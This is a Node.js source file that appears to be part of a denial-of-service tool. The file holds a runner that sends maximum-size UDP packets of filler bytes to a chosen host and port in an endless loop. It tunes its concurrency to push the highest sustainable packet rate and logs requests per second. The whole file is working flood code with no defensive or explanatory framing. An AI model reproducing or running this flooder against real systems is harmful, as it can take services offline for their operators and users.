const { sleep } = require('./sleep')
const { REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
const dgram = require('dgram')
const client = dgram.createSocket('udp4')

// max size is 9216 otherwise EMSGSIZE error
const messageBuf = Buffer.from('X'.repeat(9216))

const runner = async (host, port, CONCURRENT_REQUESTS, name) => {
  console.log(`Starting process for ${host}:${port} "${name}" with ${CONCURRENT_REQUESTS} max concurrent requests...`)

  let isRunning = true
  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0

  let errRate = 0
  let requests_made = 0
  let rps = 0

  setInterval(() => {
    console.log(name, '|', 'Req', requests_made, '|', 'Errors last min,%', errRate, '|', 'rps', rps, '|', 'R', CONCURRENT_REQUESTS)
    if (CONCURRENT_REQUESTS === 0) {
      isRunning = false
    }
  }, INTERVAL)

  const adaptivenessInterval = 10
  setInterval(() => {
    rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
    lastMinuteOk = 0
    lastMinuteErr = 0

    if (errRate > 80) {
      CONCURRENT_REQUESTS = Math.floor(rps * 0.5)
    } else if (errRate > 50) {
      CONCURRENT_REQUESTS = Math.floor(rps * 0.7)
    } else if (errRate > 20) {
      CONCURRENT_REQUESTS = Math.floor(rps * 0.9)
    } else if (errRate < 2) {
      CONCURRENT_REQUESTS = Math.min(Math.floor(rps * 1.05), MAX_CONCURRENT_REQUESTS)
    }
  }, adaptivenessInterval * 1000)

  while (isRunning) {
    if (pending < CONCURRENT_REQUESTS) {
      pending++
      client.send(messageBuf, 0, messageBuf.length, port, host, (err) => {
        if (err) {
          lastMinuteErr++
        } else {
          lastMinuteOk++
        }
        pending--
        requests_made++
        if (lastMinuteErr > 0 || lastMinuteOk > 0) {
          errRate = Math.floor(100 * (lastMinuteErr / (lastMinuteErr + lastMinuteOk)))
        }
      })
    } else {
      await sleep(REQ_DELAY)
    }
  }
}

module.exports = { runner }
